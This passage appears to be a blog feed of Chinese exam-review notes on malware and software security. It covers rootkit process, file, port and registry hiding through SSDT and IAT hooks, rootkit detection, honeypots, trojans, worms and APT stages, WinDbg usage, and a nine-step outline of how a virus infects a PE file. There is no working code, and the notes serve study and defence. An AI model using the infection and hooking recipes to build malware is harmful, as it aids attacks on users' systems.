href="#4-进程隐藏技术（P224简答）">¶</a>4.进程隐藏技术（P224简答）</h3><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210627110343743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>进程隐藏思路(如隐藏my.exe)：在用户态下，两个位置可以可用来隐藏进程，一个是psapi.dll中的EnumProcess函数，另一个为ntdll.dll中的原生API函数ZwQuerySystemInformation，钩挂这两个函数既可以用IAT钩子的方法，也可使用内联钩子的方法。</p><p>在核心态下用来隐藏的位置也有两个：修改系统服务表(SSDT)中ZwQuerySystemInformation的表项和直接修改内核中记录进程信息的结构</p><h3 id="5-文件隐藏技术（P227）"><a class="header-anchor" href="#5-文件隐藏技术（P227）">¶</a>5.文件隐藏技术（P227）</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210627172730.png"  alt=""></p><p>文件隐藏思路(如隐藏my.txt)：用户态下可通过FindFirstFile和FindNextFile来进行文件隐藏。内核态下通过修改系统服务表(SSDT)中ZwQueryDirectoryInformation对应的表项即可完成挂钩。</p><h3 id="6-通信隐藏技术（P229）"><a class="header-anchor" href="#6-通信隐藏技术（P229）">¶</a>6.通信隐藏技术（P229）</h3><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210627110412504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>通信隐藏思路(如隐藏端口)：SSDT钩挂ZwDeviceIoControlFile：首先调用ZwDeviceIoControlFile，设置Inputbuffer的参数，判断OutputBuffer中每个实体的tae_ConnLocalPort是否是隐藏的端口，若是，则删除此条实体，便实现了端口隐藏。钩挂TCPIP.sys驱动程序：IRP会向诸如netstat.exe等程序返回端口列表，只需对这样的IRP做相应处理即可隐藏端口</p><h3 id="7-注册表隐藏技术（P322）"><a class="header-anchor" href="#7-注册表隐藏技术（P322）">¶</a>7.注册表隐藏技术（P322）</h3><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210627110440405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>注册表隐藏思路(如隐藏注册表中的U盘)：通过索引查询注册表的函数是ZwEnumerateKey，对注册表键的索引就是改变相对的索引。获取注册表键值信息的函数是ZwEnumerateValueKey，与隐藏注册表键的原理一样</p><h3 id="8-Rootkit检测原理及工具（P236）"><a class="header-anchor" href="#8-Rootkit检测原理及工具（P236）">¶</a>8.Rootkit检测原理及工具（P236）</h3><ul><li>一般通过检测是否存在某种类型的钩子以此判断是否存在Rootkit<ul><li>查找SSDT钩子：查找名称为ntoskrnl.exe，查找超过ntoskrnl.exe范围之外的地址</li><li>查找内联钩子：给一个SSDT的一个函数地址，查找是否存在jmp，解析CPU要跳转的目的地址，检查这个地址是否超过了ntoskrnl.exe的可接受范围</li><li>查找IAT钩子：遍历每个DLL的每个IAT以检查是否存在任何钩子，特别要注意Kernel32.DLL和NTDLL.DLL，因为它们是进入OS的用户空间接口</li></ul></li><li>经典的Rootkit检测工具：IceSword和XueTr</li></ul><h1>第十章 病毒检测技术及检测对抗技术</h1><h3 id="1-特征值检测病毒的思路（P249简答）"><a class="header-anchor" href="#1-特征值检测病毒的思路（P249简答）">¶</a>1.特征值检测病毒的思路（P249简答）</h3><p>（1）采集已知的病毒样本：即使是同一种病毒，感染不同类型的宿主时，一般也需进行不同样本的采集</p><p>（2）从病毒样本提取特征值：特征值应足够特殊且控制在合适长度。可采用把病毒在计算机屏幕上出现的信息作为特征值或将病毒的标识作为特征值</p><p>（3）将特征值纳入病毒特征数据库：使用扫描引擎实现病毒特征的匹配，打开被检测文件，进行二进制检索，检查是否含有病毒特征数据库中的病毒特征值，以此可判断文件是否染毒、染有何种病毒</p><blockquote><p>特征值检测方法的优点：检测准确，可识别病毒的特征，误报率低，并且依据检测结果可做解毒处理</p></blockquote><h1>第十一章 恶意软件样本捕获与分析</h1><h3 id="1-什么是蜜罐，用途是什么，举例说明（P275）"><a class="header-anchor" href="#1-什么是蜜罐，用途是什么，举例说明（P275）">¶</a>1.什么是蜜罐，用途是什么，举例说明（P275）</h3><p>蜜罐通常是指没有采取安全防范措施且主动暴露在网络中的计算机，其内部运行着多种多样的行为记录程序和特殊用途的&quot;自我暴露程序&quot;，相当于一个恶意软件样本收集池。</p><p>利用蜜罐可以监控网络攻击行为、收集攻击工具和恶意代码、分析攻击方法、推测攻击意图和动机，甚至还可能根据蜜罐收集到的蛛丝马迹追踪到攻击者</p><h3 id="2-恶意软件样本捕获方法（P275）"><a class="header-anchor" href="#2-恶意软件样本捕获方法（P275）">¶</a>2.恶意软件样本捕获方法（P275）</h3><ul><li>蜜罐：见上面知识点</li><li>用户上报：个人用户发现恶意软件后主动上报给安全研究人员</li><li>云查杀平台上传：通过分布在全球的大量客户端获取可疑程序的最新信息，并主动上传到服务器，但存在个人隐私问题</li><li>诱饵邮箱：主动注册大量邮箱，定期收取电子邮件，从其中得到部分流行的恶意软件样本</li><li>样本交流：部分反病毒公司之间合作或反病毒人士分享恶意软件样本</li></ul><h3 id="3-恶意软件样本分析（P278）"><a class="header-anchor" href="#3-恶意软件样本分析（P278）">¶</a>3.恶意软件样本分析（P278）</h3><ul><li>虚拟机环境准备</li><li>系统监控：使用systeminternal即可<ul><li>包含进程监控(Process Explorer)、文件监控、注册表监控、网络连接分析、系统自启动项分析、内核监控、完整性检测</li></ul></li></ul><h1>第十三章 软件自我保护技术</h1><h3 id="1-花指令（P305）"><a class="header-anchor" href="#1-花指令（P305）">¶</a>1.花指令（P305）</h3><ul><li><p>定义：软件作者可能会在代码中加入一些特殊数据来扰乱反汇编程序，使其无法正确的转化出真实的反汇编代码，这些特殊的数据被称为花指令。</p></li><li><p>反汇编主要有两种算法</p><ul><li>线性扫描算法：依次逐个将每一条指令都反汇编成汇编指令<ul><li>花指令模式为跳转指令+干扰代码，跳转指令典型的有0FH和0E8H</li></ul></li><li>递归进行算法：模拟CPU的执行过程，根据控制流(代码可能的执行顺序)来反汇编，对每条可能的路径都进行扫描<ul><li>对付线性扫描算法的方法对它没用，需要引导反汇编工具将特定花指令数据当做控制流程中的指令片段进行反汇编，如通过无效跳转进行错误引导</li></ul></li></ul></li></ul><h3 id="2-如何检测调试器是否存在（P312简答）"><a class="header-anchor" href="#2-如何检测调试器是否存在（P312简答）">¶</a>2.如何检测调试器是否存在（P312简答）</h3><p>（1）查找是否有调试器进程</p><p>（2）查找调试器进程或文件的特征码</p><p>（3）查找特定的调试器服务</p><p>（4）查找调试器窗口</p><p>（5）句柄检测</p><p>（6）检测DBGHELP模块</p><p>（7）SeDebugPrivilege方法</p><h1>可能会出的简答汇总</h1><p>1.可信计算的基本思想</p><p>2.请你大致写出计算机的启动过程</p><p>3.一般来说，Win32病毒是怎样被运行的</p><p>4.什么是SQL注入，举个例子</p><p>5.进程隐藏技术</p><p>6.特征值检测病毒的思路</p><p>7.如何检测调试器是否存在</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;所用教材：彭国军等人编著的第一版&lt;/p&gt;
&lt;p&gt;博客地址：&lt;a href=&quot;https://blog.csdn.net/zss192&quot;&gt;https://blog.csdn.net/zss192&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;说明：博客为根据老师所画重点有</summary>
      
    
    
    
    <category term="计算机专业课" scheme="https://zss192.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
    
    <category term="计算机专业课" scheme="https://zss192.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>计算机病毒与恶意代码期末总结</title>
    <link href="https://zss192.github.io/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E4%B8%8E%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <id>https://zss192.github.io/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E4%B8%8E%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</id>
    <published>2021-07-04T07:54:00.000Z</published>
    <updated>2021-08-01T10:16:59.648Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面</h1><p>所用教材：刘功申等人编著的第四版</p><p>博客地址：<a href="https://blog.csdn.net/zss192">https://blog.csdn.net/zss192</a></p><p>说明：博客为根据老师所画重点有针对性的总结，供个人复习使用，仅供参考</p><h1>第一章 恶意代码概述</h1><h3 id="1-恶意代码的共同特征（P3选）"><a class="header-anchor" href="#1-恶意代码的共同特征（P3选）">¶</a>1.恶意代码的共同特征（P3选）</h3><ul><li>目的性：基本特征，是判别程序是否为恶意代码的最重要的特征，也是法律上判断恶意代码的标准。</li><li>传播性：恶意代码体现其生命力的重要手段。</li><li>破坏性：恶意代码的表现手段。</li></ul><h3 id="2-恶意代码种类（P9选）"><a class="header-anchor" href="#2-恶意代码种类（P9选）">¶</a>2.恶意代码种类（P9选）</h3><ul><li>普通计算机病毒</li><li>蠕虫</li><li>特洛伊木马</li><li>RootKit工具</li><li>流氓软件</li><li>间谍软件</li><li>恶意广告</li><li>逻辑炸弹</li><li>僵尸网络</li><li>网络钓鱼</li><li>恶意脚本</li><li>垃圾短信</li><li>勒索软件</li><li>移动终端恶意代码</li></ul><h3 id="3-恶意代码发作后的现象（P18选哪个不是）"><a class="header-anchor" href="#3-恶意代码发作后的现象（P18选哪个不是）">¶</a>3.恶意代码发作后的现象（P18选哪个不是）</h3><ul><li>无法启动系统</li><li>系统文件丢失或被破坏</li><li>部分BIOS程序混乱</li><li>部分文档丢失或被破坏</li><li>部分文档自动加密</li><li>目录结构发生混乱</li><li>网络无法提供正常的服务</li><li>浏览器自动访问非法网站</li></ul><h3 id="4-与病毒现象类似的故障（P19选）"><a class="header-anchor" href="#4-与病毒现象类似的故障（P19选）">¶</a>4.与病毒现象类似的故障（P19选）</h3><ul><li>硬件故障<ul><li>系统的硬件配置</li><li>电源电压不稳定</li><li>接触不良</li><li>驱动器故障</li><li>CMOS的问题</li></ul></li><li>软件故障<ul><li>软件程序已被破坏</li><li>软件与操作系统不兼容</li><li>引导过程故障</li><li>使用不同的编辑软件导致错误</li></ul></li></ul><blockquote><p>推测与第3点结合出题，给出4个选项，其中混着一个硬件故障或软件故障，让选择哪个不是恶意代码的发作现象</p></blockquote><h1>第二章 恶意代码模型及机制</h1><h3 id="1-计算机病毒的组成（P48选）"><a class="header-anchor" href="#1-计算机病毒的组成（P48选）">¶</a>1.计算机病毒的组成（P48选）</h3><ul><li>引导模块<ul><li>引导过程：驻留在内存中、窃取系统控制权、恢复系统功能</li></ul></li><li>感染模块<ul><li>传染过程<ul><li>被动传染：随着复制或网络传输工作的进行而进行</li><li>主动传染：在系统运行时，进入系统的内存储器，常驻内存监视系统的运行，用多种方式传染</li></ul></li><li>传染方式<ul><li>立即传染：病毒在被执行的瞬间，抢在宿主程序开始执行前感染磁盘上的其他程序，然后再执行宿主程序</li><li>驻留内存伺机感染：在执行程序或浏览网页时传染磁盘上的程序，在宿主程序运行结束后仍可活动，直至关闭计算机</li></ul></li></ul></li><li>破坏模块<ul><li>不一定都是删除磁盘文件，也有可能是显示一串无用的信息或干扰用户工作</li><li>破坏行为越来越隐秘，甚至窃取信息后会自动销毁</li></ul></li><li>触发模块<ul><li>病毒常用的触发条件：日期触发、时间触发、键盘触发、感染触发、启动触发、访问磁盘次数触发、CPU型号/主板型号触发</li></ul></li></ul><h3 id="2-世界上第一台计算机ENIAC是（随机访问计算机）模型（P51）"><a class="header-anchor" href="#2-世界上第一台计算机ENIAC是（随机访问计算机）模型（P51）">¶</a>2.世界上第一台计算机ENIAC是（随机访问计算机）模型（P51）</h3><h1>第三章 传统计算机病毒</h1><h3 id="1-PE文件结构及其运行原理（P66）"><a class="header-anchor" href="#1-PE文件结构及其运行原理（P66）">¶</a>1.PE文件结构及其运行原理（P66）</h3><p>PE(Portable Executable,可移植的执行体)是Win32环境自身所带的可执行文件格式。它的一些特性继承自UNIX的COFF(Common Object File Format)文件格式。</p><p>可移植的执行体意味着此文件格式是跨Win32平台的,即使 Windows运行在非 Intel的CPU上，任何Win32平台的PE装载器都能识别和使用该文件格式。</p><p>当然，移植到不同的CPU上PE执行体必然得有一些改变。除VxD和16位的DLL外，所有Win32执行文件都使用PE文件格式。因此,研究PE文件格式是我们洞悉 Windows结构的良机。</p><h3 id="2-病毒感染其他文件的步骤（P71简答）"><a class="header-anchor" href="#2-病毒感染其他文件的步骤（P71简答）">¶</a>2.病毒感染其他文件的步骤（P71简答）</h3><p>（1）判断目标文件开始的两个字节是否为MZ</p><p>（2）判断PE文件标记&quot;PE&quot;</p><p>（3）判断感染标记，如果已被感染过则跳出继续执行宿主程序，否则继续</p><p>（4）获得数据目录的个数（每个数据目录信息占8个字节）</p><p>（5）得到节表起始位置(数据目录的偏移地址+数据目录占用的字节数=节表起始位置)</p><p>（6）得到节表的末尾偏移（紧接其后用于写入一个新的病毒节信息，节表起始位置+节的个数*每个节表占用的字节数28H=节表的末尾偏移）</p><p>（7）开始写入节表</p><p>（8）在新添加的节中写入病毒代码</p><p>（9）将当前文件位置设为文件末尾</p><blockquote><p>必须背会，括号里的记不住可不写</p></blockquote><h3 id="3-Ring3与Ring0（P72）"><a class="header-anchor" href="#3-Ring3与Ring0（P72）">¶</a>3.Ring3与Ring0（P72）</h3><ul><li><p>Windows操作系统运行在保护模式，保护模式将指令执行分为4个特权级：Ring0,Ring1,Ring2,Ring3</p></li><li><p>Ring0级别最高，可以执行特权指令（OS使用）；Ring3级别最低（应用程序使用)</p></li></ul><h3 id="4-什么是宏病毒（P73）"><a class="header-anchor" href="#4-什么是宏病毒（P73）">¶</a>4.什么是宏病毒（P73）</h3><p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。</p><blockquote><p>宏：一些命令组织在一起，作为一个独立单元完成一个特定任务</p><p>经典宏病毒：美丽莎（Melissa）、台湾NO.1B、O97M.Tristate.C病毒</p></blockquote><h1>第五章 特洛伊木马</h1><h3 id="1-什么是特洛伊木马（P122）"><a class="header-anchor" href="#1-什么是特洛伊木马（P122）">¶</a>1.什么是特洛伊木马（P122）</h3><p>特洛伊木马(Trojan Horse)是一种与远程计算机之间建立起连接，使远程计算机能够通过网络控制用户计算机系统并且可能造成用户的信息损失、系统损坏甚至瘫痪的程序。</p><h3 id="2-一个完整的木马系统的组成（P122简答）"><a class="header-anchor" href="#2-一个完整的木马系统的组成（P122简答）">¶</a>2.一个完整的木马系统的组成（P122简答）</h3><ul><li>硬件部分：建立木马连接所必需的硬件实体。包括控制端、服务端、Internet</li><li>软件部分：实现远程控制所必需的软件程序。包括控制端程序、木马程序、木马配置程序</li><li>具体连接部分：通过Internet在服务端和控制端之间建立一条木马通道所必需的元素。包括控制端IP和服务端IP、控制端端口和木马端口</li></ul><h3 id="3-木马程序的基本特征（P123）"><a class="header-anchor" href="#3-木马程序的基本特征（P123）">¶</a>3.木马程序的基本特征（P123）</h3><p>欺骗性、隐蔽性(木马和远程控制软件的区别)、自动运行性、自动恢复性、功能的特殊性</p><h3 id="4-什么是网站挂马技术（P139）"><a class="header-anchor" href="#4-什么是网站挂马技术（P139）">¶</a>4.什么是网站挂马技术（P139）</h3><p>网页挂马就是攻击者通过在正常的页面中(通常是网站的主页)插入一段恶意代码。浏览者在打开该页面的时候，这段代码被执行，然后把某木马的服务器端程序或种子下载到浏览者本地并运行，进而控制浏览者的主机。</p><blockquote><p>常见的有框架挂马、js挂马、图片伪装挂马、网络钓鱼挂马、伪装挂马</p></blockquote><h3 id="5-什么是隐藏技术（P143）"><a class="header-anchor" href="#5-什么是隐藏技术（P143）">¶</a>5.什么是隐藏技术（P143）</h3><p>木马为了生存，使用许多技术隐藏自己的行为(进程、连接和端口)</p><blockquote><p>主要的隐藏技术有：反弹式木马技术、用ICMP方法隐藏连接、隐藏端口、Windows NT系统下木马进程的隐藏、远程线程技术</p></blockquote><h1>第七章 蠕虫</h1><h3 id="1-蠕虫的分类-P187"><a class="header-anchor" href="#1-蠕虫的分类-P187">¶</a>1.蠕虫的分类(P187)</h3><ul><li>一种是面向企业用户和局域网的，其利用系统漏洞，主动进行攻击，可使整个互联网瘫痪。<ul><li>爆发具有一定的突然性，查杀这种病毒并不是很难</li><li>以红色代码、尼姆达以及SQL蠕虫王为代表</li></ul></li><li>另外一种是针对个人用户的，通过网络(主要是电子邮件、恶意网页形式)迅速传播的蠕虫病毒<ul><li>比较复杂多样，常利用社会工程学欺诈和诱骗用户，造成损失非常大且很难根除</li><li>以爱虫病毒、求职信病毒为代表</li></ul></li></ul><blockquote><p>蠕虫：一种能够利用系统漏洞通过网络进行自我传播的恶意程序</p></blockquote><h3 id="2-什么是RPC漏洞（P192）"><a class="header-anchor" href="#2-什么是RPC漏洞（P192）">¶</a>2.什么是RPC漏洞（P192）</h3><p>远程过程调用RPC(Remote Procedure Call)是 Windows操作系统使用的一个协议，提供了一种进程间通信机制，通过这一机制，在一台计算机上运行的程序可以顺畅地执行某个远程系统上的代码。RPC漏洞则是利用RPC的漏洞。</p><blockquote><p>RPC中处理通过TCP/IP的消息交换的部分存在一个漏洞(错误地处理格式不正确的消息造成)</p><p>RPC漏洞影响分布式组件对象模型(DCOM)与RPC间的一个接口，此接口侦听135端口</p><p>Samba在处理用户数据输入时存在输入验证漏洞，攻击者可执行任意命令</p></blockquote><h1>第八章 勒索型恶意代码</h1><h3 id="1-勒索型恶意代码加密算法（P212）"><a class="header-anchor" href="#1-勒索型恶意代码加密算法（P212）">¶</a>1.勒索型恶意代码加密算法（P212）</h3><p>对称加密算法：AES(使用最多)，非对称加密算法：RSA</p><p>摘要：用Hash函数(也称散列函数或哈希函数)将任意长度的数据变成固定长度的数据</p><h1>第九章 其他恶意代码</h1><h3 id="1-流氓软件的定义（P227简答）"><a class="header-anchor" href="#1-流氓软件的定义（P227简答）">¶</a>1.流氓软件的定义（P227简答）</h3><p>第一个定义：流氓软件是指具有一定的实用价值但具备计算机恶意代码和黑客的部分行为特征的软件。它处在合法软件和恶意代码之间的灰色地带，使用户无法卸载，并强行弹出广告和窃取用户的私人信息。</p><p>第二个定义：流氓软件是介于恶意代码和正规软件之间，同时具备正常功能(下载、媒体播放等)和恶意行为(弹广告、开后门)的软件，给用户带来实质危害。</p><h3 id="2-Rootkit的定义（P243）"><a class="header-anchor" href="#2-Rootkit的定义（P243）">¶</a>2.Rootkit的定义（P243）</h3><p>Rootkit是攻击者用来隐藏自己的踪迹和保留root访问权限的工具。Rootkit一般都和木马、后门等其他恶意程序结合使用。</p><h3 id="3-APT的攻击过程（P246简答）"><a class="header-anchor" href="#3-APT的攻击过程（P246简答）">¶</a>3.APT的攻击过程（P246简答）</h3><ul><li>第一阶段：定向信息收集：有针对性的搜集系统和员工信息</li><li>第二阶段：单点攻击突破：采用一切可以采用的手段攻击员工的个人计算机，设法实现单点突破</li><li>第三阶段：构建通道：建立长期的联系通道，通过该通道发送攻击指令、传输数据等</li><li>第四阶段：横向渗透：以员工个人计算机为跳板，在系统内部横向渗透，以攻陷更多的个人计算机和服务器</li><li>第五阶段：目标行动：获得有价值的数据并偷运到由攻击者控制的外部</li></ul><blockquote><p>高级持续性威胁(APT)是利用先进的攻击手段对特定目标进行长期持续型网络攻击的攻击形式</p></blockquote><h3 id="4-APT的特征（P248简答）"><a class="header-anchor" href="#4-APT的特征（P248简答）">¶</a>4.APT的特征（P248简答）</h3><ul><li>高级性：APT攻击的方式相对于其他攻击形式更为高级，体现在3个方面<ul><li>高级的收集手段</li><li>高级的攻击手法</li><li>威胁高级的数据</li></ul></li><li>持续性：持续性是APT攻击的最大威胁，可以包括以下几点<ul><li>持续潜伏</li><li>持续攻击</li><li>持续欺骗</li><li>持续控制</li></ul></li></ul><h1>第十章 恶意代码防范技术</h1><h3 id="1-恶意代码防范思路（P256）"><a class="header-anchor" href="#1-恶意代码防范思路（P256）">¶</a>1.恶意代码防范思路（P256）</h3><p>（1）检测：利用静态检测、动态检测等技术，通过手工检测或自动检测等方法来识别恶意代码<br>（2）清除：根据恶意代码的类型，选择不同的方法来清除恶意代码；<br>（3）预防：通过个人防火墙和系统加固等技术来防止恶意代码对系统进行传染和破坏（被动）<br>（4）免疫：通过计算机系统本身的技术增加自己的防范能力，是一种主动的预防技术<br>（5）数据备份及恢复：及时对数据进行备份、遇到故障时保证数据可恢复<br>（6）防范策略：以单位实际情况为主要依据形成一套好的管理制度和策略</p><h1>第十一章 常用杀毒软件及其解决方案</h1><h3 id="1-杀毒软件必备功能（P287）"><a class="header-anchor" href="#1-杀毒软件必备功能（P287）">¶</a>1.杀毒软件必备功能（P287）</h3><p>查杀能力、防范新恶意代码的能力、备份和恢复能力、实时监控能力、升级能力、智能安装能、简单易用、资源占用情况、兼容性、价格、厂商的实力</p><h1>第十二章 恶意代码防治策略</h1><h3 id="1-恶意代码防止策略的基本准则（P302）"><a class="header-anchor" href="#1-恶意代码防止策略的基本准则（P302）">¶</a>1.恶意代码防止策略的基本准则（P302）</h3><ul><li>拒绝访问能力：来历不明的软件不得进入计算机系统</li><li>检测能力：系统应设置检测恶意代码的机制来阻止外来恶意代码的侵犯</li><li>控制传播的能力：应阻止恶意代码在系统中任意传播</li><li>清除能力：如果恶意代码突破了系统的防护，即使传播受到了控制，也要有相应的措施将它清除</li><li>恢复能力：系统应提供一种高效的方法来恢复被破坏的数据，将损失减到最少</li><li>替代操作：系统未恢复前用替代系统工作，等问题解决后再换回来</li></ul><h3 id="2-恶意代码的防治策略（P303简答）"><a class="header-anchor" href="#2-恶意代码的防治策略（P303简答）">¶</a>2.恶意代码的防治策略（P303简答）</h3><ul><li>国家层面<ul><li>完善相关法律法规及其贯彻落实工作</li><li>在各主干网络建立恶意代码预警系统</li><li>建立多层次恶意代码应急体系</li><li>建立动态的系统风险评估措施</li><li>建立恶意代码事故分析制度</li><li>制定完备的备份和恢复计划</li><li>提高国内运营商自身的安全性</li><li>加强信息安全培训</li><li>加强技术防范措施</li></ul></li><li>单机用户<ul><li>一般措施<ul><li>安装操作系统后第一时间进行系统升级</li><li>使用高强度的口令并定定期更换</li><li>及时安装系统补丁</li><li>重要数据应当留有备份</li><li>选择经权威机构认证的安全防范软件</li><li>使用个人防火墙保障系统的安全性</li><li>不需要使用网络时，就不要接入互联网</li><li>设置杀毒软件的邮件自动杀毒功能</li><li>正确配置恶意代码防治产品</li><li>充分利用系统提供的安全机制，正确配置系统</li><li>定期检查敏感文件</li></ul></li><li>个人用户上网基本策略<ul><li>关闭浏览器cookie选项</li><li>使用个人防火墙</li><li>浏览电子商务网站尽可能使用安全的连接方式</li><li>不透漏关键信息</li><li>避免使用过于简单的密码</li><li>不要随意打开电子邮件附件</li><li>定期扫描计算机并查找安全漏洞</li><li>使用软件的稳定版本并及时安装补丁</li><li>尽量关闭不需要的组件和服务程序</li><li>尽量使用代理服务器上网</li></ul></li></ul></li></ul><blockquote><p>应该不用记完，每个大点记住几个小点就行，尽量都记住</p></blockquote><h1>其它知识点</h1><blockquote><p>详细内容看实验文档</p></blockquote><h3 id="1-什么是符号文件"><a class="header-anchor" href="#1-什么是符号文件">¶</a>1.什么是符号文件</h3><p>符号文件（Symbol Files）是一个数据信息文件。</p><p>它包含了应用程序二进制文件（比如：EXE、DLL等）调试信息，专门用来作调试之用，最终生成的可执行文件在运行时并不需要这个符号文件，但你的程序中所有的变量信息都记录在这个文件中。所以调试应用程序时，这个文件是非常重要的。</p><p>符号文件可能包含：全局变量、局部变量、函数名称和其入口点的地址、帧指针省略 (FPO) 记录、源行号，其中每个项分别称为一个符号。</p><p>在 Windows 系统中，符号文件以 .pdb 为扩展名</p><p>windbg调试器键入ctrl+s打开符号表路径设置</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628105246.png"  alt=""></p><blockquote><p>windbg命令行下载符号文件（.sympath设置加载路径，也可按上图那样设置路径）</p><p>.sympath srv*c:\MyServerSymbols*<a href="https://msdl.microsoft.com/download/symbols">https://msdl.microsoft.com/download/symbols</a></p><p>.reload /f</p></blockquote><h3 id="2-用户模式调试和内核模式调试的区别"><a class="header-anchor" href="#2-用户模式调试和内核模式调试的区别">¶</a>2.用户模式调试和内核模式调试的区别</h3><p>用户模式调试是在Ring3级别调试，而内核模式调试在Ring0级别调试</p><p>如WinDbg是由Microsoft开发的内核模式调试器，可用于调试运行它的操作系统本身。这意味着它可以调试内核代码，即运行在Ring 0中的特权代码。</p><p>而OllyDbg是一个用户模式调试器，它只能调试用户模式的可执行文件，例如Exe。</p><p>内核模式调试环境通常有两台计算机：主计算机和目标计算机，二者通过以太网电缆连接，也可以用命名管道连接(如VMware)</p><h3 id="3-windbg串口-串行端口-问题"><a class="header-anchor" href="#3-windbg串口-串行端口-问题">¶</a>3.windbg串口(串行端口)问题</h3><p>windbg内核调试使用虚拟机调试时需要设置串口</p><p>管道名称：\\.\pipe\com1（注意打印机会占用端口1，若使用端口1需先删除打印机设备）</p><p>主计算机：选择从客户端到一个虚拟机器</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628103326.png"  alt=""></p><p>目标计算机：选择从服务器到一个虚拟机器</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628103450.png"  alt=""></p><p>调试机中win+R键入c:\boot.ini打开系统启动配置.然后添加一行配置，如下</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628105621.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628105749.png"  alt=""></p><p>右键windbg快捷方式，选择属性-&gt;快捷方式-&gt;目标，在后面添加-b -k com:port=1,baud=115200</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628105006.jpg"  alt=""></p><h3 id="4-EMACS常用命令（选）"><a class="header-anchor" href="#4-EMACS常用命令（选）">¶</a>4.EMACS常用命令（选）</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>打开文件</td><td>C-x C-f</td></tr><tr><td>保存文件</td><td>C-x C-s</td></tr><tr><td>保存所有文件</td><td>C-x s</td></tr><tr><td>另存为文件</td><td>C-x C-w</td></tr><tr><td>退出Emacs</td><td>C-x C-c</td></tr><tr><td>打开SHELL</td><td>M-x shell</td></tr><tr><td>执行SHELL命令</td><td>M-!</td></tr><tr><td>粘贴</td><td>C-y</td></tr><tr><td>切换到 EVIL 模式</td><td>M-x evil-mode</td></tr></tbody></table><p>若安装插件，先配置.emacs文件（windows是init.el文件）</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628110903.png"  alt=""></p><p>运行 M-x package-refresh-contents 刷新插件服务器内容</p><p>运行 M-x package-install RET 后输入 M-x evil-org 安装此插件</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210628111019.png"  alt=""></p><h3 id="5-windbg常用命令（选）"><a class="header-anchor" href="#5-windbg常用命令（选）">¶</a>5.windbg常用命令（选）</h3><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">解释</th><th style="text-align:center">示例</th></tr></thead><tbody><tr><td style="text-align:center">bp</td><td style="text-align:center">某个地址下断点</td><td style="text-align:center"><code>bp @exentry</code>、<code>bp 0x88888888</code>、<code>bp MyApp!Func</code></td></tr><tr><td style="text-align:center">g</td><td style="text-align:center">继续执行</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">bu</td><td style="text-align:center">针对某个符号下断点</td><td style="text-align:center"><code>bu test1!main</code> 在test1程序的main函数下断点</td></tr><tr><td style="text-align:center">bm</td><td style="text-align:center">支持正则表达式断点</td><td style="text-align:center"><code>bm *!draw*</code></td></tr><tr><td style="text-align:center">bl</td><td style="text-align:center">列出所有断点</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">bc</td><td style="text-align:center">清除断点</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">ba</td><td style="text-align:center">指定内存被访问触发断点</td><td style="text-align:center">ba Access Size [地址]：<code>ba w4 0x0483DFE</code></td></tr><tr><td style="text-align:center">!address</td><td style="text-align:center">目标进程内存使用</td><td style="text-align:center"><code>!address Address</code></td></tr><tr><td style="text-align:center">!address</td><td style="text-align:center">将堆栈地址分开</td><td style="text-align:center"><code>!address -summary</code></td></tr><tr><td style="text-align:center">!dh</td><td style="text-align:center">扩展显示指定映像的头部</td><td style="text-align:center"><code>!dh -h</code>、<code>!dh -f notepad</code>、<code>!dh ntdll</code></td></tr><tr><td style="text-align:center">!lmi</td><td style="text-align:center">某个模块的详细信息</td><td style="text-align:center"><code>!lmi ntdll</code></td></tr><tr><td style="text-align:center">lm</td><td 